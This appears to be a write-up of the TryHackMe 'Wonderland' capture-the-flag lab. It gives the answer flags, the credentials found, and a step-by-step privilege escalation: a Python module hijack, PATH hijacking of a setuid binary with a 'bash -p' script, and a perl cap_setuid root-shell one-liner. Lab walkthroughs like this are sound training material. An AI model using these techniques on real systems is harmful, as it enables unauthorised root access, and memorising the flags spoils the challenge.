# Wonderland 10.10.145.12

## TASK 1  Capture the flags
+ Obtain the flag in user.txt
    - thm{"Curiouser and curiouser!"}
+ Escalate your privileges, what is the flag in root.txt?
    - thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}


+ Gatering Information 
    - nmap `nmap -sC -sV 10.10.145.12 > nmap_wonderland`
    - gobuster `gobuster dir -u http://10.10.145.12 -w ~/HackTools/directory-list-2.3-medium.txt`
        - Found directory with `http://10.10.145.12/r/a/b/b/i/t/`
        - Found Credential with hidden tag p `alice:HowDothTheLittleCrocodileImproveHisShiningTail`
+ Enumeration
    - SSH with credential `alice:HowDothTheLittleCrocodileImproveHisShiningTail`
    - Checking `walrus_and_the_carpenter.py`
    ```python
    import random
    poem = """The sun was shining on the sea,
    Shining with all his might:
    He did his very best to make
    The billows smooth and bright —
    And this was odd, because it was
    The middle of the night.

    The moon was shining sulkily,
    Because she thought the sun
    Had got no business to be there
    After the day was done —
    "It’s very rude of him," she said,
    "To come and spoil the fun!"

    The sea was wet as wet could be,
    The sands were dry as dry.
    You could not see a cloud, because
    No cloud was in the sky:
    No birds were flying over head —
    There were no birds to fly.

    The Walrus and the Carpenter
    Were walking close at hand;
    They wept like anything to see
    Such quantities of sand:
    "If this were only cleared away,"
    They said, "it would be grand!"

    "If seven maids with seven mops
    Swept it for half a year,
    Do you suppose," the Walrus said,
    "That they could get it clear?"
    "I doubt it," said the Carpenter,
    And shed a bitter tear.

    "O Oysters, come and walk with us!"
    The Walrus did beseech.
    "A pleasant walk, a pleasant talk,
    Along the briny beach:
    We cannot do with more than four,
    To give a hand to each."

    The eldest Oyster looked at him.
    But never a word he said:
    The eldest Oyster winked his eye,
    And shook his heavy head —
    Meaning to say he did not choose
    To leave the oyster-bed.

    But four young oysters hurried up,
    All eager for the treat:
    Their coats were brushed, their faces washed,
    Their shoes were clean and neat —
    And this was odd, because, you know,
    They hadn’t any feet.

    Four other Oysters followed them,
    And yet another four;
    And thick and fast they came at last,
    And more, and more, and more —
    All hopping through the frothy waves,
    And scrambling to the shore.

    The Walrus and the Carpenter
    Walked on a mile or so,
    And then they rested on a rock
    Conveniently low:
    And all the little Oysters stood
    And waited in a row.

    "The time has come," the Walrus said,
    "To talk of many things:
    Of shoes — and ships — and sealing-wax —
    Of cabbages — and kings —
    And why the sea is boiling hot —
    And whether pigs have wings."

    "But wait a bit," the Oysters cried,
    "Before we have our chat;
    For some of us are out of breath,
    And all of us are fat!"
    "No hurry!" said the Carpenter.
    They thanked him much for that.

    "A loaf of bread," the Walrus said,
    "Is what we chiefly need:
    Pepper and vinegar besides
    Are very good indeed —
    Now if you’re ready Oysters dear,
    We can begin to feed."

    "But not on us!" the Oysters cried,
    Turning a little blue,
    "After such kindness, that would be
    A dismal thing to do!"
    "The night is fine," the Walrus said
    "Do you admire the view?

    "It was so kind of you to come!
    And you are very nice!"
    The Carpenter said nothing but
    "Cut us another slice:
    I wish you were not quite so deaf —
    I’ve had to ask you twice!"

    "It seems a shame," the Walrus said,
    "To play them such a trick,
    After we’ve brought them out so far,
    And made them trot so quick!"
    The Carpenter said nothing but
    "The butter’s spread too thick!"

    "I weep for you," the Walrus said.
    "I deeply sympathize."
    With sobs and tears he sorted out
    Those of the largest size.
    Holding his pocket handkerchief
    Before his streaming eyes.

    "O Oysters," said the Carpenter.
    "You’ve had a pleasant run!
    Shall we be trotting home again?"
    But answer came there none —
    And that was scarcely odd, because
    They’d eaten every one."""

    for i in range(10):
        line = random.choice(poem.split("\n"))
    ```

    ```bash
    alice@wonderland:~$ ls /home
    alice  hatter  rabbit  tryhackme
    alice@wonderland:~$ cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
    messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
    _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
    lxd:x:105:65534::/var/lib/lxd/:/bin/false
    uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
    dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
    landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
    pollinate:x:109:1::/var/cache/pollinate:/bin/false
    sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
    tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
    alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
    hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
    rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
    

    alice@wonderland:~$ sudo -l
    [sudo] password for alice:
    Matching Defaults entries for alice on wonderland:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User alice may run the following commands on wonderland:
        (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
    ```
+ Priviledge Escalation
    - From user alice Abusing python walrus_and_the_carpenter.py with random
    - Create file random.py on the same folder with script on /home/alice
    - script 
    ```python
    #!/usr/bin/env python

    import os
    os.system('/bin/bash')
    ```
    - run script with sudo permission `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
    - Check home folder of rabbit
    ```bash
    rabbit@wonderland:/home/rabbit$ ls -la
    total 40
    drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
    drwxr-xr-x 6 root   root    4096 May 25  2020 ..
    lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
    -rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
    -rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
    -rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
    -rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
    
    rabbit@wonderland:/home/rabbit$ file teaParty
    teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped

    rabbit@wonderland:/home/rabbit$ echo $PATH
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
    ```

    - File teaParty is a ELF bynary file and it's call /bin/echo with full path and using `date` without full path can we abuse this ?
    - create bash file with name is `date` and update path on first checking
    ```bash
    rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
    rabbit@wonderland:/home/rabbit$ echo $PATH
    /home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

    #!/bin/bash
    bash -p

    rabbit@wonderland:/home/rabbit$ ./teaParty
    Welcome to the tea party!
    The Mad Hatter will be here soon.
    Probably by hatter@wonderland:/home/rabbit$
    ```

    - After abusing date we get user hatter and found `password.txt` with `WhyIsARavenLikeAWritingDesk?` string ASCII on that file 
    - Trying SSH using user hatter `ssh hatter@10.10.145.12`
    - running linpeas found capabilities using perl and check capabilities on GTFoBin for perl

    ```bash
    Files with capabilities (limited to 50):
    /usr/bin/perl5.26.1 = cap_setuid+ep

    perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

    root@wonderland:/root# cat user.txt
    thm{"Curiouser and curiouser!"}
    root@wonderland:/root# cat /home/alice/root.txt
    thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
    ```
